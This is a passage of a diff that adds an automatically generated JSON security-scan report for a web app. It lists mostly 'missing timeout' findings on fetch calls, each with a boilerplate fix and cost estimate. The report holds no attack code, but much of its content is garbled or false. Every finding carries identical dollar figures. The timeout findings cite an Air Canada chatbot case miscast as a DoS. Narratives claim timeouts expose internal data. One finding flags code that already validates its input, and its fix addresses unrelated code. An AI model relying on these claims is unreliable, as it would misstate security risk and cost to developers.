+      "kind": "logic",
+      "severity": "medium",
+      "vuln": "Missing Timeout on Outbound HTTP Request (DoS)",
+      "cwe": "CWE-400",
+      "stride": "Denial of Service",
+      "file": "explore/ExploreWorkspace.tsx",
+      "line": 298,
+      "snippet": "const prepareRes = await fetch(\"/api/stellar\", {",
+      "fix": {
+        "description": "Set a timeout on all outbound requests to prevent event-loop starvation from stalled upstreams.",
+        "code": "// fetch (Node 18+)\nconst resp = await fetch(url, { signal: AbortSignal.timeout(5000) });\n\n// axios\nawait axios.get(url, { timeout: 5000 });\n\n// node http\nconst req = http.get(url, cb);\nreq.setTimeout(5000, () => req.destroy());"
+      },
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage",
+        "confidence": "low",
+        "narrative": "Missing Timeout on Outbound HTTP Request (DoS) on `explore/ExploreWorkspace.tsx:298` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage."
+      },
+      "parser": "LOGIC",
+      "family": null
+    },
+    {
+      "id": "c754ece74e0c54ec",
+      "kind": "logic",
+      "severity": "medium",
+      "vuln": "Missing Timeout on Outbound HTTP Request (DoS)",
+      "cwe": "CWE-400",
+      "stride": "Denial of Service",
+      "file": "explore/ExploreWorkspace.tsx",
+      "line": 348,
+      "snippet": "await fetch(`${BACKEND_URL}/api/listings`, {",
+      "fix": {
+        "description": "Set a timeout on all outbound requests to prevent event-loop starvation from stalled upstreams.",
+        "code": "// fetch (Node 18+)\nconst resp = await fetch(url, { signal: AbortSignal.timeout(5000) });\n\n// axios\nawait axios.get(url, { timeout: 5000 });\n\n// node http\nconst req = http.get(url, cb);\nreq.setTimeout(5000, () => req.destroy());"
+      },
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage",
+        "confidence": "low",
+        "narrative": "Missing Timeout on Outbound HTTP Request (DoS) on `explore/ExploreWorkspace.tsx:348` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage."
+      },
+      "parser": "LOGIC",
+      "family": null
+    },
+    {
+      "id": "629acb837a744cf6",
+      "kind": "logic",
+      "severity": "medium",
+      "vuln": "Missing Timeout on Outbound HTTP Request (DoS)",
+      "cwe": "CWE-400",
+      "stride": "Denial of Service",
+      "file": "order/page.tsx",
+      "line": 27,
+      "snippet": "const res = await fetch(\"/api/stellar\", {",
+      "fix": {
+        "description": "Set a timeout on all outbound requests to prevent event-loop starvation from stalled upstreams.",
+        "code": "// fetch (Node 18+)\nconst resp = await fetch(url, { signal: AbortSignal.timeout(5000) });\n\n// axios\nawait axios.get(url, { timeout: 5000 });\n\n// node http\nconst req = http.get(url, cb);\nreq.setTimeout(5000, () => req.destroy());"
+      },
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage",
+        "confidence": "low",
+        "narrative": "Missing Timeout on Outbound HTTP Request (DoS) on `order/page.tsx:27` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage."
+      },
+      "parser": "LOGIC",
+      "family": null
+    },
+    {
+      "id": "ec99901bd62115bf",
+      "kind": "logic",
+      "severity": "medium",
+      "vuln": "Missing Timeout on Outbound HTTP Request (DoS)",
+      "cwe": "CWE-400",
+      "stride": "Denial of Service",
+      "file": "profile/page.tsx",
+      "line": 98,
+      "snippet": "const res = await fetch(`${BACKEND_URL}/api/profile`, {",
+      "fix": {
+        "description": "Set a timeout on all outbound requests to prevent event-loop starvation from stalled upstreams.",
+        "code": "// fetch (Node 18+)\nconst resp = await fetch(url, { signal: AbortSignal.timeout(5000) });\n\n// axios\nawait axios.get(url, { timeout: 5000 });\n\n// node http\nconst req = http.get(url, cb);\nreq.setTimeout(5000, () => req.destroy());"
+      },
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage",
+        "confidence": "low",
+        "narrative": "Missing Timeout on Outbound HTTP Request (DoS) on `profile/page.tsx:98` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage."
+      },
+      "parser": "LOGIC",
+      "family": null
+    },
+    {
+      "id": "7f9361b495b4e583",
+      "kind": "logic",
+      "severity": "medium",
+      "vuln": "Missing Timeout on Outbound HTTP Request (DoS)",
+      "cwe": "CWE-400",
+      "stride": "Denial of Service",
+      "file": "profile/page.tsx",
+      "line": 136,
+      "snippet": "const res = await fetch(\"/api/farmer-id/upload-url\", {",
+      "fix": {
+        "description": "Set a timeout on all outbound requests to prevent event-loop starvation from stalled upstreams.",
+        "code": "// fetch (Node 18+)\nconst resp = await fetch(url, { signal: AbortSignal.timeout(5000) });\n\n// axios\nawait axios.get(url, { timeout: 5000 });\n\n// node http\nconst req = http.get(url, cb);\nreq.setTimeout(5000, () => req.destroy());"
+      },
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage",
+        "confidence": "low",
+        "narrative": "Missing Timeout on Outbound HTTP Request (DoS) on `profile/page.tsx:136` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage."
+      },
+      "parser": "LOGIC",
+      "family": null
+    },
+    {
+      "id": "94f72adaf2f7a071",
+      "kind": "logic",
+      "severity": "medium",
+      "vuln": "Missing Timeout on Outbound HTTP Request (DoS)",
+      "cwe": "CWE-400",
+      "stride": "Denial of Service",
+      "file": "profile/page.tsx",
+      "line": 143,
+      "snippet": "const putRes = await fetch(data.uploadUrl, { method: \"PUT\", headers: { \"Content-Type\": file.type, \"x-goog-content-length-range\": `0,10485760` }, body: file });",
+      "fix": {
+        "description": "Set a timeout on all outbound requests to prevent event-loop starvation from stalled upstreams.",
+        "code": "// fetch (Node 18+)\nconst resp = await fetch(url, { signal: AbortSignal.timeout(5000) });\n\n// axios\nawait axios.get(url, { timeout: 5000 });\n\n// node http\nconst req = http.get(url, cb);\nreq.setTimeout(5000, () => req.destroy());"
+      },
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage",
+        "confidence": "low",
+        "narrative": "Missing Timeout on Outbound HTTP Request (DoS) on `profile/page.tsx:143` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage."
+      },
+      "parser": "LOGIC",
+      "family": null
+    },
+    {
+      "id": "6eb51c64e1c25746",
+      "kind": "logic",
+      "severity": "medium",
+      "vuln": "Missing Timeout on Outbound HTTP Request (DoS)",
+      "cwe": "CWE-400",
+      "stride": "Denial of Service",
+      "file": "api/openeo/route.ts",
+      "line": 10,
+      "snippet": "const response = await fetch(url, init);",
+      "fix": {
+        "description": "Set a timeout on all outbound requests to prevent event-loop starvation from stalled upstreams.",
+        "code": "// fetch (Node 18+)\nconst resp = await fetch(url, { signal: AbortSignal.timeout(5000) });\n\n// axios\nawait axios.get(url, { timeout: 5000 });\n\n// node http\nconst req = http.get(url, cb);\nreq.setTimeout(5000, () => req.destroy());"
+      },
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage",
+        "confidence": "low",
+        "narrative": "Missing Timeout on Outbound HTTP Request (DoS) on `api/openeo/route.ts:10` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage."
+      },
+      "parser": "LOGIC",
+      "family": null
+    },
+    {
+      "id": "53fd583770db56d5",
+      "kind": "logic",
+      "severity": "medium",
+      "vuln": "Missing Timeout on Outbound HTTP Request (DoS)",
+      "cwe": "CWE-400",
+      "stride": "Denial of Service",
+      "file": "api/openeo/route.ts",
+      "line": 68,
+      "snippet": "const tokenRes = await fetch(discovery.token_endpoint, {",
+      "fix": {
+        "description": "Set a timeout on all outbound requests to prevent event-loop starvation from stalled upstreams.",
+        "code": "// fetch (Node 18+)\nconst resp = await fetch(url, { signal: AbortSignal.timeout(5000) });\n\n// axios\nawait axios.get(url, { timeout: 5000 });\n\n// node http\nconst req = http.get(url, cb);\nreq.setTimeout(5000, () => req.destroy());"
+      },
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage",
+        "confidence": "low",
+        "narrative": "Missing Timeout on Outbound HTTP Request (DoS) on `api/openeo/route.ts:68` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage."
+      },
+      "parser": "LOGIC",
+      "family": null
+    },
+    {
+      "id": "591ad8ba026a0fe0",
+      "kind": "logic",
+      "severity": "medium",
+      "vuln": "Missing Unsigned Numeric Validation",
+      "cwe": "CWE-20",
+      "stride": "Tampering",
+      "file": "api/price/route.ts",
+      "line": 16,
+      "snippet": "if (typeof price !== \"number\" || price <= 0) throw new Error(\"invalid price\");",
+      "fix": {
+        "description": "Validate that numeric inputs are positive integers server-side before processing.",
+        "code": "// BEFORE\nawait BasketItem.update({ quantity: req.body.quantity });\n\n// AFTER\nif (!Number.isInteger(req.body.quantity) || req.body.quantity < 1)\n  return res.status(400).json({ error: 'Invalid quantity' });"
+      },
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Generic finding — likely cost driven by user count + jurisdiction stack",
+        "confidence": "low",
+        "narrative": "Missing Unsigned Numeric Validation on `api/price/route.ts:16` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Generic finding — likely cost driven by user count + jurisdiction stack."
+      },
+      "parser": "LOGIC",
+      "family": null
+    },
+    {
+      "id": "d9386a5c4cf2afbe",
+      "kind": "logic",
+      "severity": "medium",
+      "vuln": "Missing Timeout on Outbound HTTP Request (DoS)",
+      "cwe": "CWE-400",
+      "stride": "Denial of Service",
+      "file": "api/price/route.ts",
+      "line": 10,
+      "snippet": "const res = await fetch(",
+      "fix": {
+        "description": "Set a timeout on all outbound requests to prevent event-loop starvation from stalled upstreams.",
+        "code": "// fetch (Node 18+)\nconst resp = await fetch(url, { signal: AbortSignal.timeout(5000) });\n\n// axios\nawait axios.get(url, { timeout: 5000 });\n\n// node http\nconst req = http.get(url, cb);\nreq.setTimeout(5000, () => req.destroy());"
+      },
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage",
+        "confidence": "low",
+        "narrative": "Missing Timeout on Outbound HTTP Request (DoS) on `api/price/route.ts:10` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage."
+      },
+      "parser": "LOGIC",
+      "family": null
+    },
+    {
+      "id": "c9416079f3c3811a",
+      "kind": "logic",
+      "severity": "medium",
+      "vuln": "Missing Timeout on Outbound HTTP Request (DoS)",
+      "cwe": "CWE-400",
+      "stride": "Denial of Service",
+      "file": "api/ai/chat/route.ts",
+      "line": 53,
+      "snippet": "const res = await fetch(`${NVIDIA_BASE}/chat/completions`, {",
+      "fix": {
+        "description": "Set a timeout on all outbound requests to prevent event-loop starvation from stalled upstreams.",
+        "code": "// fetch (Node 18+)\nconst resp = await fetch(url, { signal: AbortSignal.timeout(5000) });\n\n// axios\nawait axios.get(url, { timeout: 5000 });\n\n// node http\nconst req = http.get(url, cb);\nreq.setTimeout(5000, () => req.destroy());"
+      },
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage",
+        "confidence": "low",
+        "narrative": "Missing Timeout on Outbound HTTP Request (DoS) on `api/ai/chat/route.ts:53` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage."
+      },
+      "parser": "LOGIC",
+      "family": null
+    },
+    {
+      "id": "054885b17a13cf53",
+      "kind": "logic",
+      "severity": "medium",
+      "vuln": "Missing Timeout on Outbound HTTP Request (DoS)",
+      "cwe": "CWE-400",
+      "stride": "Denial of Service",
+      "file": "api/ai/ndvi-summary/route.ts",
+      "line": 59,
+      "snippet": "const res = await fetch(`${NVIDIA_BASE}/chat/completions`, {",
+      "fix": {
+        "description": "Set a timeout on all outbound requests to prevent event-loop starvation from stalled upstreams.",
+        "code": "// fetch (Node 18+)\nconst resp = await fetch(url, { signal: AbortSignal.timeout(5000) });\n\n// axios\nawait axios.get(url, { timeout: 5000 });\n\n// node http\nconst req = http.get(url, cb);\nreq.setTimeout(5000, () => req.destroy());"
+      },
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage",
+        "confidence": "low",
+        "narrative": "Missing Timeout on Outbound HTTP Request (DoS) on `api/ai/ndvi-summary/route.ts:59` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage."
+      },
+      "parser": "LOGIC",
+      "family": null
+    },
+    {
+      "id": "bf0f35f59ebb5be5",
+      "kind": "logic",
+      "severity": "medium",
+      "vuln": "Missing Timeout on Outbound HTTP Request (DoS)",
+      "cwe": "CWE-400",
+      "stride": "Denial of Service",
+      "file": "api/verification/run/route.ts",
+      "line": 38,
+      "snippet": "const response = await fetch(url, init);",
+      "fix": {
+        "description": "Set a timeout on all outbound requests to prevent event-loop starvation from stalled upstreams.",
+        "code": "// fetch (Node 18+)\nconst resp = await fetch(url, { signal: AbortSignal.timeout(5000) });\n\n// axios\nawait axios.get(url, { timeout: 5000 });\n\n// node http\nconst req = http.get(url, cb);\nreq.setTimeout(5000, () => req.destroy());"
+      },
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage",
+        "confidence": "low",
